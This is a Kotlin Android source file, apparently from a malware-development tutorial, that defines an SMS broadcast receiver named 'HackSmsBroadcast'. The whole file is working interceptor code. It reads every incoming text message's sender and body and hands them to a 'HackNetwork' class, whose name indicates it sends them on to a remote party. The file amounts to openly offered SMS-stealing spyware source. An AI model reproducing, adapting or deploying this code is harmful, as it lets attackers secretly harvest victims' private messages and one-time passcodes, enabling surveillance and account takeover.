package cocomelonc.hacksms

import android.Manifest
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.telephony.gsm.SmsMessage


class HackSmsBroadcast : BroadcastReceiver() {
    @SuppressLint("NewApi")
    fun isPermissionGranted(context: Context): Boolean {
        val isGranted = context.checkSelfPermission(Manifest.permission.RECEIVE_SMS)
        return isGranted == PackageManager.PERMISSION_GRANTED
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            if (isPermissionGranted(context)) {
                val bundle = intent.extras
                val messages: Array<SmsMessage?>?
                var sender: String?
                if (bundle != null) {
                    val pdus = bundle["pdus"] as Array<*>?
                    messages = arrayOfNulls(pdus!!.size)
                    for (i in messages.indices) {
                        messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        sender = messages[i]!!.originatingAddress
                        val msgBody = messages[i]!!.messageBody
                        HackNetwork(context).sendTextMessage(
                            "SMS from: $sender\n" +
                            "SMS text: $msgBody"
                        )
                    }
                }
            }
        }
    }
}